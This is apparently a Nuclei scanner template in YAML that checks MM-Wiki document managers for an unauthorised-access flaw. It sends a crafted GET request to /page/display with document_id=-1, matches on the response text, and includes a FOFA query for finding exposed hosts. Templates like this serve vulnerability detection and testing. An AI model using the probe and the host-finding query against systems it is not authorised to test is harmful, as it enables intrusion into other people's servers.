id: mm-wiki-display-unauth

info:
  name: mm-wiki-display-unauth
  author: unknow
  severity: high
  description: mm 文档管理器 存在未授权访问漏洞。
  tags:  mm-wiki,unauth
  metadata:
    fofa-qeury: header="mmwikissid"

http:
  - raw:
      - |              
        GET /page/display?document_id=-1 HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains(body, "很抱歉，文档不存在！")'
